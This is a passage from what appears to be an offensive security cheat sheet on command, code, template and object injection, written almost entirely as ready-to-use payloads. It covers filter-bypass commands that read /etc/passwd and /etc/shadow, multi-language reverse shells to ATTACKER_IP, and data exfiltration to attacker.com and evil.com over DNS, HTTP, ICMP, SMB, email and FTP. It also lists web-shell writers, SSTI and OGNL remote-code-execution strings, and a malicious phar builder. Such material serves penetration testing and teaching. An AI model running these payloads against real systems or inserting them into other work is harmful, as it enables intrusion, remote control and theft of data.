backtick operator ``

# Node.js
child_process.exec()
child_process.spawn() with shell:true
eval()

# Java
Runtime.getRuntime().exec()
ProcessBuilder

# Ruby
system()
exec()
``
%x[]
```

## Command Injection Detection

### Basic Injection Techniques

Test for command injection by appending shell metacharacters to input parameters:

```bash
# Command separators
;
|
||
&
&&
`
$()
\n (newline)

# Basic test payloads
test; whoami
test | whoami
test || whoami
test & whoami
test && whoami
test `whoami`
test $(whoami)
```

### Systematic Testing Methodology

```bash
# Test URL parameters
https://target.com/ping?host=127.0.0.1;whoami
https://target.com/ping?host=127.0.0.1|whoami
https://target.com/ping?host=127.0.0.1%26whoami

# Test POST parameters
curl -X POST https://target.com/diagnose \
  -d "ip=127.0.0.1; id"

# Test with URL encoding
curl "https://target.com/ping?host=127.0.0.1%3Bwhoami"

# Test with double URL encoding
curl "https://target.com/ping?host=127.0.0.1%253Bwhoami"
```

### Out-of-Band Detection

When command output is not reflected in responses, use out-of-band techniques:

```bash
# DNS exfiltration
; nslookup $(whoami).attacker.com
; host $(whoami).attacker.com
| dig $(whoami).attacker.com

# HTTP requests
; curl http://attacker.com/$(whoami)
; wget http://attacker.com/?data=$(id|base64)

# Using Burp Collaborator or interactsh
; ping -c 3 burpcollaborator.net
; curl https://unique-id.oast.fun

# Time-based detection
; sleep 10
| ping -c 10 127.0.0.1
```

### Platform-Specific Detection

```bash
# Linux/Unix
; uname -a
; cat /etc/passwd
; id
; pwd

# Windows
& dir
| whoami
&& ipconfig
; net user

# Both platforms
; ping -c 1 127.0.0.1  # Linux
; ping -n 1 127.0.0.1  # Windows
```

## Advanced Command Injection Techniques

### Filter Bypass Methods

**Space Bypass:**

```bash
# Using Internal Field Separator (IFS)
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# Using tabs
cat%09/etc/passwd

# Using brace expansion
{cat,/etc/passwd}

# Using variable expansion
cat</etc/passwd
```

**Keyword Filtering Bypass:**

```bash
# String concatenation
c'a't /etc/passwd
c"a"t /etc/passwd
c\at /etc/passwd

# Variable expansion
CA=ca;TB=t;$CA$TB /etc/passwd

# Base64 encoding
echo Y2F0IC9ldGMvcGFzc3dk | base64 -d | bash

# Hex encoding
echo -e "\x63\x61\x74 \x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" | bash

# Using wildcards
/bin/c?t /etc/passwd
/bin/ca* /etc/passwd
```

**Special Character Filtering:**

```bash
# Newline injection
%0acommand
%0dcommand

# Null byte injection (older PHP versions)
command%00

# Case variation
Cat /etc/passwd
CAT /etc/passwd

# Inline execution
$(cat /etc/passwd)
`cat /etc/passwd`
```

### Reverse Shell Payloads

**Bash Reverse Shell:**

```bash
# Standard TCP reverse shell
bash -i >& /dev/tcp/attacker-ip/4444 0>&1

# Alternative format
bash -c 'bash -i >& /dev/tcp/attacker-ip/4444 0>&1'

# Encoded version
echo YmFzaCAtaSA+JiAvZGV2L3RjcC9hdHRhY2tlci1pcC80NDQ0IDA+JjE= | base64 -d | bash

# URL-encoded version
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fattacker-ip%2F4444%200%3E%261%27
```

**Python Reverse Shell:**

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python3 version
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker-ip",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
```

**Netcat Reverse Shell:**

```bash
# Traditional netcat
nc -e /bin/bash attacker-ip 4444

# Without -e flag
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker-ip 4444 >/tmp/f

# OpenBSD netcat
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc attacker-ip 4444 >/tmp/f
```

**Listener Setup:**

```bash
# Setup listener on attacker machine
nc -lvnp 4444

# Or with pwncat for enhanced functionality
pwncat-cs -lp 4444

# Or with metasploit
msfconsole
use exploit/multi/handler
set payload linux/x64/shell_reverse_tcp
set LHOST attacker-ip
set LPORT 4444
exploit
```

### Data Exfiltration

```bash
# Direct output capture (if visible)
; cat /etc/passwd

# DNS exfiltration
; cat /etc/passwd | while read line; do nslookup $line.attacker.com; done

# HTTP POST exfiltration
; curl -X POST -d "$(cat /etc/passwd)" http://attacker.com/receive

# Base64 encode and exfiltrate
; cat /etc/passwd | base64 | curl -X POST -d @- http://attacker.com/data

# File upload via curl
; curl -F "file=@/etc/passwd" http://attacker.com/upload
```

### Blind Command Injection

When there's no direct output, confirm execution through side channels:

```bash
# Time delays
; sleep 10 &
| ping -c 10 127.0.0.1

# Write to web-accessible directory
; whoami > /var/www/html/output.txt
; id > /tmp/result && curl http://attacker.com/?done=1

# Create marker files
; touch /tmp/injected-$(whoami)

# Trigger external requests
; curl http://attacker.com/marker?executed=true
```

## Time-Based Detection

### Basic Time-Based Testing

Using sleep commands to detect blind command injection:

```bash
# Linux/Unix time delays
; sleep 10
& sleep 10
| sleep 10
|| sleep 10
&& sleep 10
$(sleep 10)
`sleep 10`

# Windows time delays
; ping -n 10 127.0.0.1
& ping -n 10 127.0.0.1
| ping -n 10 127.0.0.1
&& timeout 10

# Cross-platform time delay testing
; sleep 10 & ping -n 10 127.0.0.1
```

### URL-Encoded Payloads

Testing with encoded characters:

```bash
# URL encoding for special characters
%3B sleep 10        # ; sleep 10
%26 sleep 10        # & sleep 10
%7C sleep 10        # | sleep 10
%0A sleep 10        # newline + sleep 10

# Double URL encoding
%253B sleep 10      # encoded semicolon
%2526 sleep 10      # encoded ampersand
```

### Time-Based Detection Script

Automated timing analysis:

```python
#!/usr/bin/env python3
import requests
import time
import statistics

def test_command_injection(url, param, delay=5):
    """
    Test for command injection using time-based detection
    """
    payloads = [
        f"; sleep {delay}",
        f"& sleep {delay}",
        f"| sleep {delay}",
        f"|| sleep {delay}",
        f"&& sleep {delay}",
        f"$(sleep {delay})",
        f"`sleep {delay}`",
        f"; ping -n {delay} 127.0.0.1",
    ]
    
    # Baseline timing
    baseline_times = []
    for _ in range(3):
        start = time.time()
        requests.get(url, params={param: "normal_value"}, timeout=30)
        baseline_times.append(time.time() - start)
    
    baseline_avg = statistics.mean(baseline_times)
    threshold = baseline_avg + delay - 1  # Allow 1 second margin
    
    print(f"[*] Baseline average: {baseline_avg:.2f}s")
    print(f"[*] Detection threshold: {threshold:.2f}s")
    
    for payload in payloads:
        start = time.time()
        try:
            requests.get(url, params={param: payload}, timeout=delay + 10)
            elapsed = time.time() - start
            
            if elapsed >= threshold:
                print(f"[+] VULNERABLE: {payload}")
                print(f"    Response time: {elapsed:.2f}s")
            else:
                print(f"[-] No delay: {payload} ({elapsed:.2f}s)")
        except requests.Timeout:
            print(f"[+] VULNERABLE (timeout): {payload}")
        except Exception as e:
            print(f"[!] Error with {payload}: {e}")

# Usage
test_command_injection("http://target.com/search", "query", delay=5)
```

### Context-Specific Time Delays

Testing in different injection contexts:

```bash
# Within quotes
"$(sleep 5)"
'$(sleep 5)'
"`sleep 5`"

# After filename/path
file.txt; sleep 5
/path/to/file && sleep 5
document.pdf | sleep 5

# In arithmetic context
$((1+1)); sleep 5
```

### Statistical Timing Analysis

[Inference] Multiple measurements improve reliability:

```python
#!/usr/bin/env python3
import requests
import time
import numpy as np

def timing_attack_statistical(url, param, payload, iterations=5):
    """
    Perform statistical analysis of response times
    """
    normal_times = []
    injection_times = []
    
    # Measure normal responses
    for _ in range(iterations):
        start = time.time()
        requests.get(url, params={param: "test"})
        normal_times.append(time.time() - start)
    
    # Measure injection responses
    for _ in range(iterations):
        start = time.time()
        requests.get(url, params={param: payload})
        injection_times.append(time.time() - start)
    
    # Statistical comparison
    normal_mean = np.mean(normal_times)
    normal_std = np.std(normal_times)
    injection_mean = np.mean(injection_times)
    
    # Z-score calculation
    z_score = (injection_mean - normal_mean) / normal_std if normal_std > 0 else 0
    
    print(f"Normal response: {normal_mean:.2f}s Â± {normal_std:.2f}s")
    print(f"Injection response: {injection_mean:.2f}s")
    print(f"Z-score: {z_score:.2f}")
    
    # Significant if z-score > 3 (99.7% confidence)
    return z_score > 3
```

## Reverse Shell Generation

### Bash Reverse Shells

Standard bash reverse shell payloads:

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1

# Alternative bash syntax
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/PORT; sh <&196 >&196 2>&196

# Base64 encoded bash shell
echo "YmFzaCAtaSA+JiAvZGV2L3RjcC9BVFRBQ0tFUl9JUC9QT1JUIDAmMQ==" | base64 -d | bash

# URL-encoded for web injection
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2FATTACKER_IP%2FPORT%200%3E%261%27
```

### Netcat Reverse Shells

Using netcat variants:

```bash
# Traditional netcat
nc ATTACKER_IP PORT -e /bin/bash

# Netcat without -e flag
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# OpenBSD netcat
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP PORT > /tmp/f

# Netcat with command chaining
; nc ATTACKER_IP PORT -e /bin/bash
& nc ATTACKER_IP PORT -e /bin/bash
| nc ATTACKER_IP PORT -e /bin/bash
```

### Python Reverse Shells

Python-based shells for systems with Python installed:

```python
# Python reverse shell (single line)
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Python3 version
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'

# Python PTY shell (more stable)
python -c 'import pty;pty.spawn("/bin/bash")'
```

### PHP Reverse Shells

PHP shells for web application contexts:

```php
// PHP system execution reverse shell
<?php system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>

// PHP exec reverse shell
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'"); ?>

// PHP passthru reverse shell
<?php passthru("nc ATTACKER_IP PORT -e /bin/bash"); ?>

// One-liner PHP shell
php -r '$sock=fsockopen("ATTACKER_IP",PORT);exec("/bin/sh -i <&3 >&3 2>&3");'
```

### Perl Reverse Shells

Perl-based reverse shells:

```perl
# Perl reverse shell
perl -e 'use Socket;$i="ATTACKER_IP";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Perl without sh
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"ATTACKER_IP:PORT");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### PowerShell Reverse Shells (Windows)

Windows-specific PowerShell shells:

```powershell
# PowerShell reverse shell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"

# Base64 encoded PowerShell
powershell -nop -w hidden -e BASE64_ENCODED_COMMAND
```

### msfvenom Payload Generation

Using Metasploit's msfvenom for shell generation:

```bash
# List available payloads
msfvenom -l payloads | grep shell

# Linux bash reverse shell
msfvenom -p cmd/unix/reverse_bash LHOST=ATTACKER_IP LPORT=PORT -f raw

# Linux netcat reverse shell
msfvenom -p cmd/unix/reverse_netcat LHOST=ATTACKER_IP LPORT=PORT -f raw

# Python reverse shell
msfvenom -p cmd/unix/reverse_python LHOST=ATTACKER_IP LPORT=PORT -f raw

# Windows PowerShell reverse shell
msfvenom -p cmd/windows/reverse_powershell LHOST=ATTACKER_IP LPORT=PORT -f raw

# PHP reverse shell
msfvenom -p php/reverse_php LHOST=ATTACKER_IP LPORT=PORT -f raw

# Perl reverse shell
msfvenom -p cmd/unix/reverse_perl LHOST=ATTACKER_IP LPORT=PORT -f raw
```

### Listener Setup

Setting up listeners to catch reverse shells:

```bash
# Netcat listener
nc -lvnp PORT

# Netcat with verbose output
nc -lvnp PORT -v

# Metasploit multi/handler
msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST ATTACKER_IP; set LPORT PORT; exploit"

# Socat listener (more stable)
socat TCP-LISTEN:PORT,reuseaddr,fork EXEC:/bin/bash

# OpenSSL encrypted listener
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
openssl s_server -quiet -key key.pem -cert cert.pem -port PORT
```

## Out-of-Band Exfiltration

### DNS Exfiltration

Using DNS queries for data extraction:

```bash
# Basic DNS exfiltration
; nslookup $(whoami).ATTACKER_DOMAIN
; dig $(whoami).ATTACKER_DOMAIN

# Extract /etc/passwd via DNS
; cat /etc/passwd | while read line; do nslookup $line.ATTACKER_DOMAIN; done

# Base64 encode before DNS exfiltration
; cat /etc/passwd | base64 | while read line; do nslookup $line.ATTACKER_DOMAIN; done
```

DNS listener setup:

```bash
# Using dnsmasq
sudo dnsmasq -d -q --log-queries

# Using tcpdump
sudo tcpdump -i any -n port 53

# Using Python DNS server
python3 -m dnslib.server --log
```

### HTTP/HTTPS Exfiltration

Exfiltrating data via HTTP requests:

```bash
# Simple HTTP GET exfiltration
; curl http://ATTACKER_IP/?data=$(whoami)
; wget http://ATTACKER_IP/?data=$(cat /etc/passwd | base64)

# HTTP POST exfiltration
; curl -X POST http://ATTACKER_IP -d "data=$(cat sensitive.txt)"

# HTTPS with data in headers
; curl -H "X-Data: $(whoami)" https://ATTACKER_IP

# Multi-file exfiltration
; for file in /etc/passwd /etc/shadow; do curl http://ATTACKER_IP/?file=$file --data-binary @$file; done
```

HTTP listener for exfiltration:

```bash
# Python HTTP server with logging
python3 -m http.server 8000

# Netcat HTTP listener
while true; do nc -lvnp 8000; done

# Custom Python listener
python3 << 'EOF'
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class ExfilHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        query = urllib.parse.parse_qs(parsed.query)
        print(f"[+] Received: {query}")
        self.send_response(200)
        self.end_headers()
    
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        print(f"[+] POST data: {data.decode()}")
        self.send_response(200)
        self.end_headers()

HTTPServer(('0.0.0.0', 8000), ExfilHandler).serve_forever()
EOF
```

### ICMP Exfiltration

Using ICMP packets for data transmission:

```bash
# ICMP ping with data
; ping -c 1 -p $(echo "sensitive_data" | xxd -p) ATTACKER_IP

# ICMP exfiltration script
; cat sensitive.txt | xxd -p -c 16 | while read line; do ping -c 1 -p $line ATTACKER_IP; done
```

ICMP listener:

```bash
# Using tcpdump
sudo tcpdump -i any icmp -X

# Extract data from ICMP packets
sudo tcpdump -i any icmp -X | grep "0x0010"
```

### SMB/CIFS Exfiltration (Windows)

Windows-specific exfiltration methods:

```powershell
# Copy file to SMB share
; copy C:\sensitive.txt \\ATTACKER_IP\share\

# Net use with credentials
; net use \\ATTACKER_IP\share /user:attacker password
; copy C:\sensitive.txt \\ATTACKER_IP\share\

# PowerShell copy
; powershell -c "Copy-Item C:\sensitive.txt -Destination \\ATTACKER_IP\share\"
```

SMB server setup (Kali Linux):

```bash
# Using Impacket smbserver
impacket-smbserver share /tmp/share -smb2support

# With authentication
impacket-smbserver share /tmp/share -smb2support -username attacker -password password
```

### Email Exfiltration

Sending data via email:

```bash
# Using mail command
; echo "sensitive data" | mail -s "Exfil" attacker@evil.com

# Using sendmail
; cat /etc/passwd | sendmail attacker@evil.com

# SMTP exfiltration
; curl smtp://ATTACKER_IP:25 --mail-from sender@target.com --mail-rcpt attacker@evil.com --upload-file /etc/passwd
```

### FTP Exfiltration

Uploading files via FTP:

```bash
# FTP upload
; curl -T /etc/passwd ftp://ATTACKER_IP --user username:password

# Multiple file upload
; for file in /etc/*; do curl -T $file ftp://ATTACKER_IP/$(basename $file) --user user:pass; done
```

FTP server setup:

```bash
# Python pyftpdlib
python3 -m pyftpdlib -p 21 -w

# vsftpd configuration (more permanent)
sudo apt install vsftpd
sudo systemctl start vsftpd
```

## Code Injection (eval, exec)

### PHP Code Injection

Exploiting eval and similar functions in PHP:

```php
// Basic eval injection
eval($_GET['code']);
// Payload: ?code=system('whoami');

// assert() injection
assert($_GET['code']);
// Payload: ?code=system('id')

// preg_replace /e modifier (deprecated)
preg_replace('/.*/e', $_GET['code'], 'test');
// Payload: ?code=system('ls')

// create_function injection
$func = create_function('', $_GET['code']);
// Payload: ?code=system('cat /etc/passwd');
```

PHP code injection payloads:

```php
// File operations
?code=file_put_contents('shell.php','<?php system($_GET[c]);?>');

// Command execution
?code=system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"');

// Read files
?code=echo file_get_contents('/etc/passwd');

// Directory listing
?code=print_r(scandir('/'));
```

### Python Code Injection

Exploiting eval/exec in Python:

```python
# eval() injection
result = eval(user_input)
# Payload: __import__('os').system('whoami')

# exec() injection
exec(user_input)
# Payload: __import__('os').system('id')

# compile() + eval() injection
code = compile(user_input, '<string>', 'eval')
eval(code)
```

Python code injection payloads:

```python
# Import os and execute commands
__import__('os').system('ls -la')

# Reverse shell
__import__('os').system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')

# Read files
open('/etc/passwd').read()

# Write files
open('backdoor.py','w').write('import os;os.system("nc -e /bin/bash ATTACKER_IP PORT")')

# List directory
__import__('os').listdir('/')

# Execute with subprocess
__import__('subprocess').call(['ls','-la'])
```

### JavaScript Code Injection (Node.js)

Exploiting eval in Node.js:

```javascript
// eval() injection
eval(userInput);
// Payload: require('child_process').exec('whoami')

// Function constructor injection
new Function(userInput)();
// Payload: require('child_process').exec('id')

// VM module injection
const vm = require('vm');
vm.runInThisContext(userInput);
```

Node.js code injection payloads:

```javascript
// Command execution
require('child_process').exec('whoami', (e,stdout)=>console.log(stdout))

// Reverse shell
require('child_process').exec('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')

// Read files
require('fs').readFileSync('/etc/passwd','utf8')

// Write files
require('fs').writeFileSync('shell.js','require("child_process").exec("nc -e /bin/bash IP PORT")')

// List directory
require('fs').readdirSync('/')
```

### Ruby Code Injection

Exploiting eval in Ruby:

```ruby
# eval() injection
eval(params[:code])
# Payload: system('whoami')

# Kernel.eval injection
Kernel.eval(user_input)

# instance_eval injection
object.instance_eval(user_input)
```

Ruby code injection payloads:

```ruby
# Command execution
system('id')
`whoami`
exec('ls -la')

# Reverse shell
system('bash -c "bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1"')

# Read files
File.read('/etc/passwd')

# Write files
File.write('shell.rb', 'system("nc -e /bin/bash ATTACKER_IP PORT")')
```

### Template Injection Leading to Code Execution

Server-Side Template Injection (SSTI) examples:

```python
# Jinja2 (Python)
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Twig (PHP)
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("whoami")}}

# Freemarker (Java)
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("whoami") }
```

### Important Related Topics

For complete command injection and code execution coverage, explore **OS Command Injection Filters & WAF Bypass**, **Deserialization Attacks**, **Server-Side Template Injection (SSTI)**, and **RCE via File Upload**.

## Template Injection

Template injection occurs when user input is embedded into template engines without proper sanitization. This allows attackers to inject template directives that execute arbitrary code.

### Detection Methodology

**Polyglot Detection Payload:**

```
${{<%[%'"}}%\.
```

This payload triggers errors or unusual behavior in multiple template engines.

**Mathematical Expression Testing:**

```
{{7*7}}
${7*7}
<%= 7*7 %>
${{7*7}}
#{7*7}
```

If the application returns `49` instead of the literal string, template injection is likely present.

### Testing Workflow

```bash
# Test in URL parameters
https://target.com/page?name={{7*7}}

# Test in POST data
curl -X POST https://target.com/profile \
  -d "bio={{7*7}}"

# Test in headers
curl https://target.com/ \
  -H "User-Agent: {{7*7}}"

# Test in JSON
curl -X POST https://target.com/api/user \
  -H "Content-Type: application/json" \
  -d '{"name":"{{7*7}}"}'
```

## Server-Side Template Injection (SSTI)

SSTI enables attackers to execute code on the server by exploiting template engine features.

### Jinja2 (Python)

**Detection:**

```python
{{7*7}}  # Returns 49
{{config}}  # Exposes configuration
{{self}}  # Shows template context
```

**Information Disclosure:**

```python
# Access configuration
{{config.items()}}

# List all classes
{{''.__class__.__mro__[1].__subclasses__()}}

# Read files
{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
```

**Remote Code Execution:**

```python
# Execute system commands via subprocess.Popen
{{''.__class__.__mro__[1].__subclasses__()[396]('whoami',shell=True,stdout=-1).communicate()}}

# Alternative RCE payload
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Using lipsum
{{lipsum.__globals__.os.popen('id').read()}}

# Using cycler
{{cycler.__init__.__globals__.os.popen('id').read()}}

# Using joiner
{{joiner.__init__.__globals__.os.popen('id').read()}}
```

**Reverse Shell via Jinja2:**

```python
{{config.__class__.__init__.__globals__['os'].popen('bash -c "bash -i >& /dev/tcp/attacker-ip/4444 0>&1"').read()}}
```

### Twig (PHP)

**Detection:**

```php
{{7*7}}  # Returns 49
{{_self}}  # Shows environment
```

**RCE Payloads:**

```php
# Execute system command
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}

# Alternative method
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}

# File read
{{'/etc/passwd'|file_excerpt(1,30)}}
```

### Freemarker (Java)

**Detection:**

```java
${7*7}  # Returns 49
```

**RCE Payload:**

```java
# Execute command
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }

# Alternative
<#assign cmd="id">
<#assign result=cmd?eval>
${result}

# Read files
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/etc/passwd').toURL().openStream().readAllBytes()?join(",")}
```

### Velocity (Java)

**Detection:**

```java
#set($x=7*7)
$x  # Returns 49
```

**RCE Payload:**

```java
#set($runtime = $class.forName("java.lang.Runtime"))
#set($process = $runtime.getRuntime().exec("id"))
#set($input = $process.getInputStream())
#set($sc = $class.forName("java.util.Scanner"))
#set($constructor = $sc.getConstructor($class.forName("java.io.InputStream")))
#set($scanner = $constructor.newInstance($input).useDelimiter("\A"))
#if($scanner.hasNext())
$scanner.next()
#end
```

### Smarty (PHP)

**Detection:**

```php
{$smarty.version}  # Shows Smarty version
{7*7}  # Returns 49
```

**RCE Payloads:**

```php
# Smarty 3
{system('id')}
{php}system('id');{/php}

# Using eval
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['cmd']); ?>",self::clearConfig())}
```

### Pug/Jade (Node.js)

**Detection:**

```javascript
#{7*7}  # Returns 49
```

**RCE Payload:**

```javascript
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('whoami')}()}

# Alternative
#{global.process.mainModule.require('child_process').execSync('id').toString()}
```

### Handlebars (Node.js)

**Detection:**

```javascript
{{7*7}}  # May return 49 or literal depending on context
```

**RCE Payload (limited contexts):**

```javascript
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### EL (Expression Language) - Java

**Detection:**

```java
${7*7}  # Returns 49
${"a".toString()}  # Returns "a"
```

**RCE Payloads:**

```java
# Using Runtime
${Runtime.getRuntime().exec('id')}

# Alternative method
${"".getClass().forName("java.lang.Runtime").getRuntime().exec("id")}

# Using ProcessBuilder
${pageContext.request.getSession().setAttribute("r","".getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null))}

# Read files
${pageContext.request.getClass().getClassLoader().getResourceAsStream('/etc/passwd')}
```

## Expression Language Injection

Expression Language (EL) injection affects Java applications using JSP, JSF, and Spring frameworks.

### Spring Framework EL

**Detection:**

```java
*{7*7}
#{7*7}
T(java.lang.System).getProperty('user.name')
```

**RCE via Spring EL:**

```java
# Execute system command
T(java.lang.Runtime).getRuntime().exec('whoami')

# Alternative payload
#this.getClass().forName('java.lang.Runtime').getRuntime().exec('id')

# Using ProcessBuilder
new java.lang.ProcessBuilder({'whoami'}).start()
```

### OGNL (Object-Graph Navigation Language)

Used in Apache Struts and other frameworks.

**Detection:**

```java
%{7*7}
${7*7}
```

**RCE Payloads:**

```java
# Execute command
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='whoami').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(@org.apache.commons.io.IOUtils@toString(#process.getInputStream()))}
```

## PHP Object Injection

PHP object injection occurs when untrusted data is passed to `unserialize()` function, allowing attackers to manipulate object properties and trigger magic methods.

### Understanding PHP Serialization

```php
# Serialize object
$obj = new stdClass();
$obj->name = "test";
$serialized = serialize($obj);
// Output: O:8:"stdClass":1:{s:4:"name";s:4:"test";}

# Unserialize object
$obj = unserialize($serialized);
```

### Detection

```php
# Look for unserialize() calls
grep -r "unserialize" /path/to/code

# Test with basic object
O:8:"stdClass":0:{}

# Test in cookies, POST data, parameters
curl https://target.com/page \
  --cookie "data=O:8:\"stdClass\":0:{}"
```

### Magic Methods Exploitation

PHP magic methods automatically execute during specific object lifecycle events:

```php
__construct()  # Object creation
__destruct()   # Object destruction
__wakeup()     # After unserialize()
__toString()   # Object to string conversion
__call()       # Calling inaccessible methods
__get()        # Accessing inaccessible properties
__set()        # Setting inaccessible properties
```

### RCE via PHP Object Injection

[Inference] Exploitation requires identifying vulnerable classes with dangerous magic methods in the target application.

**Example Vulnerable Code:**

```php
class FileHandler {
    public $filename;
    
    function __destruct() {
        // Vulnerable: executes system command
        system("rm " . $this->filename);
    }
}

// Vulnerable endpoint
$data = unserialize($_COOKIE['data']);
```

**Exploitation:**

```php
# Create malicious object
class FileHandler {
    public $filename = "; whoami";
}

$payload = new FileHandler();
echo serialize($payload);
// O:11:"FileHandler":1:{s:8:"filename";s:8:"; whoami";}

# Send payload
curl https://target.com/page \
  --cookie "data=O:11:\"FileHandler\":1:{s:8:\"filename\";s:8:\"; whoami\";}"
```

### PHP Generic Gadget Chains

**phpggc** - Tool for generating PHP object injection payloads:

```bash
# Install phpggc
git clone https://github.com/ambionics/phpggc.git
cd phpggc

# List available gadget chains
./phpggc -l

# Generate RCE payload for Laravel
./phpggc Laravel/RCE1 system id

# Generate payload with base64 encoding
./phpggc -b Laravel/RCE1 system id

# Generate payload for specific framework
./phpggc Symfony/RCE4 system whoami

# Generate file write payload
./phpggc Monolog/RW1 /tmp/shell.php '<?php system($_GET["cmd"]); ?>'
```

### Phar Deserialization

Phar archives can trigger `unserialize()` when used with file operations:

```php
# Create malicious phar
<?php
class Exploit {
    public $command = "whoami";
    
    function __destruct() {
        system($this->command);
    }
}

$phar = new Phar('exploit.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new Exploit());
$phar->addFromString('test.txt', 'test');
$phar->stopBuffering();
?>

# Trigger via file operations
file_exists('phar://exploit.phar/test.txt')
file_get_contents('phar://exploit.phar/test.txt')
include('phar://exploit.phar/test.txt')
```

## Command Injection Tools

### Commix (Command Injection Exploiter)

```bash
# Install
git clone https://github.com/commixproject/commix.git
cd commix

# Basic usage
python commix.py --url="https://target.com/ping?ip=127.0.0.1"

# Test POST parameters
python commix.py --url="https://target.com/diagnose" \
  --data="ip=127.0.0.1"

# Specify injection technique
python commix.py --url="https://target.com/ping?ip=127.0.0.1" \
  --technique=time-based

# Use custom headers
python commix.py --url="https://target.com/page" \
  --header="User-Agent: INJECT_HERE"

# Get OS shell
python commix.py --url="https://target.com/ping?ip=INJECT_HERE" \
  --os-shell

# File upload
